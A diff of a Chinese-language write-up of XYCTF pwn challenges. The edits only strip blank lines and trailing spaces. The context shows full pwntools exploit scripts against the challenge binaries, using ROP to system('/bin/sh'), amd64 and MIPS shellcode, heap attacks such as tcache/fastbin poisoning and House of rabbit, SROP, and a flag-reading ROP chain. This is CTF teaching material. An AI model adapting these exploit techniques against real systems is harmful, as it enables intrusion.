@@ -57,7 +57,6 @@ info('rdi: ' + hex(rdi))
 info('system: ' + hex(system))
 info('binsh: ' + hex(binsh))
 
-
 payload = b'a'*0x27 + b'x' +p64(rdi+1)+ p64(rdi)+p64(binsh) + p64(system)
 io.send(payload)
 
@@ -133,7 +132,6 @@ from pwn import *
 context.log_level = 'debug'
 context.arch = 'amd64'
 context.terminal = ['tmux', 'splitw', '-h']
-
 
 shellcode = '''
 mov rdi,0xffffff9c
@@ -225,7 +223,6 @@ payload += p64(syscall)
 io.recvuntil(b'static_link? ret2??')
 io.sendline(payload)
 
-
 io.interactive()
 ```
 
@@ -251,7 +248,7 @@ int __fastcall main(int argc, const char **argv, const char **envp)
 知道了 `libc` 地址
 利用 scanf 可以在任意地址写任意内容
 调试发现 `libc` 和 `ld` 有固定偏移
-所以可以直接写 `ld` 上的 **exit_hook(__rtld_lock_lock_recursive/__rtld_lock_unlock_recursive)** 
+所以可以直接写 `ld` 上的 **exit_hook(__rtld_lock_lock_recursive/__rtld_lock_unlock_recursive)**
 写为 `one_gadget`.
 
 ### exp
@@ -269,7 +266,6 @@ gdb.attach(io, 'b *0x40128D')
 
 # addr = 'xxxx'.split(':')
 # io = remote(addr[0], int(addr[1]))
-
 
 io.recvuntil(b'Welcome to xyctf, this is a gift: 0x')
 libc.address = int(io.recvline().strip(), 16) - 0x61cc0
@@ -445,7 +441,6 @@ io.sendline(b'256')
 io.sendline(b'4')
 io.sendline(b'flag')
 
-
 io.interactive()
 ```
 
@@ -515,7 +510,6 @@ gdb.attach(io, 'b *0x401283')
 
 # addr = 'xxx'.split(':')
 # io = remote(addr[0], int(addr[1]))
-
 
 io.recvuntil(b'Your name:')
 io.sendline(b'1')
@@ -599,7 +593,6 @@ sh = asm('''mov rax,0x68732f6e69622f
             syscall
          ''')
 
-
 io = process('./vuln')
 gdb.attach(io, 'b *$rebase(0x135F)')
 
@@ -666,7 +659,6 @@ context.log_level = 'debug'
 context.arch = 'amd64'
 context.terminal = ['tmux', 'splitw', '-h']
 
-
 while True:
     try:
         io = process('./pwn')
@@ -682,7 +674,6 @@ while True:
             io.send(p64(0x40132B)*2)
             io.recvuntil(b'id:')
             io.sendline(b'0')
-
 
         io.recvuntil(b'index')
         io.sendline(b'32')
@@ -814,33 +805,27 @@ context.terminal = ['tmux', 'splitw', '-h']
 libc = ELF('./libc-2.31.so')
 elf = ELF('./vuln')
 
-
 io = process(elf.path)
 # gdb.attach(io, 'b *0x40154C')
 
 # addr = 'xxxxxx'.split(':')
 # io = remote(addr[0], int(addr[1]))
 
-
 def cmd(s):
     io.sendlineafter(b'>>> ', s)
-
 
 def add(idx, content):
     cmd(b'1')
     io.sendlineafter(b'please input note idx', str(idx).encode())
     io.sendafter(b'please input content', content)
 
-
 def delete(idx):
     cmd(b'2')
     io.sendlineafter(b'please input note idx', str(idx).encode())
 
-
 def show(idx):
     cmd(b'3')
     io.sendlineafter(b'please input note idx', str(idx).encode())
-
 
 for i in range(12):
     add(i, b'x' * 0x20)
@@ -848,10 +833,8 @@ for i in range(12):
 for i in range(11):
     delete(i)
 
-
 cmd(b'1')
 io.sendlineafter(b'please input note idx', str(0xcafebeef).encode()*0x100)
-
 
 show(7)
 libc.address = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x1ecd90
@@ -974,14 +957,11 @@ signwrite.rdx = 0x3c
 signwrite.rip = syscall
 signwrite.rsp = 0
 
-
 io.sendline(b'flag\0\0\0\0' + p64(signrt) + bytes(signopen) + p64(signrt) +
             bytes(signread) + p64(signrt) + bytes(signwrite))
 
-
 io.interactive()
 ```
-
 
 ## 11. one_byte
 off by one 和 uaf
@@ -1167,7 +1147,7 @@ ssize_t __fastcall read_data(void *a1, int a2)
 ```
 
 ### 分析
-_off by one_ + _uaf_ 
+_off by one_ + _uaf_
 填满 `tcache bin` 然后 _fastbin atk_
 修改 `malloc hook`
 
@@ -1186,32 +1166,26 @@ io = process('./vuln')
 # addr = 'xxxxxx'.split(':')
 # io = remote(addr[0], int(addr[1]))
 
-
 def cmd(c: int):
     io.sendlineafter(b'>>> ', str(c).encode())
-
 
 def add(idx: int, size: int):
     cmd(1)
     io.sendlineafter(b'[?] please input chunk_idx: ', str(idx).encode())
     io.sendlineafter(b'[?] Enter chunk size: ', str(size).encode())
 
-
 def delete(idx: int):
     cmd(2)
     io.sendlineafter(b'[?] please input chunk_idx: ', str(idx).encode())
-
 
 def show(idx: int):
     cmd(3)
     io.sendlineafter(b'[?] please input chunk_idx: ', str(idx).encode())
 
-
 def edit(idx: int, data: bytes):
     cmd(4)
     io.sendlineafter(b'[?] please input chunk_idx: ', str(idx).encode())
     io.send(data)
-
 
 for i in range(7):
     add(i, 0xb0)
@@ -1287,7 +1261,7 @@ int vuln()
 十分简洁，就是普通的栈溢出
 但是在 `mips` 里找不到 `pop rdi;ret` 类似的 gadgets
 不过，`mips` 的所有段都可执行
-可以直接写 `shellcode` 
+可以直接写 `shellcode`
 
 ### exp
 ```python
@@ -1295,7 +1269,6 @@ from pwn import *
 
 context.log_level = 'debug'
 context.arch = 'mips'
-
 
 shellcode = asm('''li $t6, 0x6e69622f
 li $t7,0x68732f
@@ -1312,10 +1285,8 @@ syscall
 nop
 ''')
 
-
 # io = process(['qemu-mipsel-static','-g' ,'1234', './mips'])
 io = process(['qemu-mipsel-static', './mips'])
-
 
 # addr = 'xxxxxx'.split(':')
 # io = remote(addr[0], int(addr[1]))
@@ -1554,8 +1525,8 @@ int _()
 }
 ```
 ### 分析
-_UAF_ ,还能直接泄露 `libc`
-覆盖 hello_world 和 gift 
+_UAF_ ，还能直接泄露 `libc`
+覆盖 hello_world 和 gift
 
 ### exp
 ```python
@@ -1573,11 +1544,9 @@ io = process(elf.path)
 # addr = 'xxxx'.split(':')
 # io = remote(addr[0], int(addr[1]))
 
-
 def cmd(c: int):
     io.recvuntil(b'>>> ')
     io.sendline(str(c).encode())
-
 
 def add(idx: int, size: int, content: bytes):
     cmd(1)
@@ -1588,18 +1557,15 @@ def add(idx: int, size: int, content: bytes):
     io.recvuntil(b'[?] Enter chunk data: ')
     io.send(content)
 
-
 def delete(idx: int):
     cmd(2)
     io.recvuntil(b'[?] Enter chunk id: ')
     io.sendline(str(idx).encode())
 
-
 def show(idx: int):
     cmd(3)
     io.recvuntil(b'[?] Enter chunk id: ')
     io.sendline(str(idx).encode())
-
 
 cmd(114514)
 io.recvuntil(b'0x')
@@ -1617,12 +1583,10 @@ io.recvuntil(b'a'*0x10)
 heap_addr = u64(io.recvn(6).ljust(8, b'\x00')) - 0x2c0
 info('heap_addr:' + hex(heap_addr))
 
-
 add(2, 0x18, b'c'*0x10)
 add(3, 0x30, p64(0)+p64(0xa1))
 add(4, 0x20, b'e'*0x20)
 add(5, 0x20, b'f'*0x20)
-
 
 delete(2)
 add(6, 0x18, p64(0x90)+p64(1)+p64(heap_addr+0x3a0))
@@ -1812,7 +1776,7 @@ unsigned __int64 view_chunk()
 ### 分析
 事实上，_UAF_ 还是存在
 通过 _House of rabbit_ 绕过 flag 检测
-可以泄露 `libc`,进而泄露 `stack`
+可以泄露 `libc`，进而泄露 `stack`
 题目本意貌似是让打 exit_hook
 笔者逃课打 _ROP_
 ### exp
@@ -1833,11 +1797,9 @@ io = process('./vuln')
 # addr = 'xxxxx'.split(':')
 # io = remote(addr[0], int(addr[1]))
 
-
 def cmd(c: int):
     io.recvuntil(b'>>> ')
     io.sendline(str(c).encode())
-
 
 def add(idx: int, size: int, content: bytes):
     cmd(1)
@@ -1848,18 +1810,15 @@ def add(idx: int, size: int, content: bytes):
     io.recvuntil(b'[?] Enter chunk data: ')
     io.send(content)
 
-
 def delete(idx: int):
     cmd(2)
     io.recvuntil(b'[?] Enter chunk id: ')
     io.sendline(str(idx).encode())
 
-
 def show(idx: int):
     cmd(3)
     io.recvuntil(b'[?] Enter chunk id: ')
     io.sendline(str(idx).encode())
-
 
 for i in range(7):
     add(i, 0x18, b'a')
@@ -1876,7 +1835,6 @@ show(0)
 libc.address = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x21ace0
 log.info(f'libc base: {hex(libc.address)}')
 
-
 add(1, 0x18, b'a'*0x10)
 show(1)
 io.recvuntil(b'a'*0x10)
@@ -1892,7 +1850,6 @@ info('stack leak: ' + hex(stack))
 
 add(0, 0x50, b'a'*0x20)
 
-
 add(4, 0x20, p64(0)+p64(0x81))
 add(5, 0x30, b'a')
 add(6, 0x30, b'a')
@@ -1905,7 +1862,6 @@ delete(8)
 
 delete(6)
 delete(5)
-
 
 con = p64(0)*2
 con += p64(0) + p64(0x21)
@@ -2128,11 +2084,9 @@ io = process('./vuln')
 # addr = 'xxxxx'.split(':')
 # io = remote(addr[0], int(addr[1]))
 
-
 def cmd(c: int):
     io.recvuntil(b'>>> ')
     io.sendline(str(c).encode())
-
 
 def add(idx: int, size: int, content: bytes):
     cmd(1)
@@ -2143,18 +2097,15 @@ def add(idx: int, size: int, content: bytes):
     io.recvuntil(b'[?] Enter chunk data: ')
     io.send(content)
 
-
 def delete(idx: int):
     cmd(2)
     io.recvuntil(b'[?] Enter chunk id: ')
     io.sendline(str(idx).encode())
 
-
 def show(idx: int):
     cmd(3)
     io.recvuntil(b'[?] Enter chunk id: ')
     io.sendline(str(idx).encode())
-
 
 for i in range(7):
     add(i, 0x18, b'a')
@@ -2171,7 +2122,6 @@ show(0)
 libc.address = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x21ace0
 log.info(f'libc base: {hex(libc.address)}')
 
-
 add(1, 0x18, b'a'*0x10)
 show(1)
 io.recvuntil(b'a'*0x10)
@@ -2184,7 +2134,6 @@ add(3, 0x18, p64(0x28)+p64(1)+p64(libc.symbols['environ']))
 show(2)
 stack = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x138
 info('stack leak: ' + hex(stack))
-
 
 # 清理 bins
 add(0, 0x40, b'x'*0x10)
@@ -2204,12 +2153,10 @@ add(0, 0x70, b'x'*0x10)
 add(0, 0x70, b'x'*0x10)
 add(0, 0x70, b'./flag\x00')
 
-
 rdi = libc.address + 0x2a3e5
 rsi = libc.address + 0x2be51
 rdx_r12 = libc.address + 0x11f2e7
 rsp = libc.address + 0x35732
-
 
 # orw 栈
 con = p64(rdi) + p64(heap + 0x1610)
@@ -2232,7 +2179,6 @@ con += p64(rdx_r12) + p64(0x40)
 con += p64(0) + p64(libc.symbols['write'])
 con += p64(rsp) + p64(0)
 add(2, 0x70, con)
-
 
 con = p64(0)+p64(0x71)
 add(3, 0x20, con)
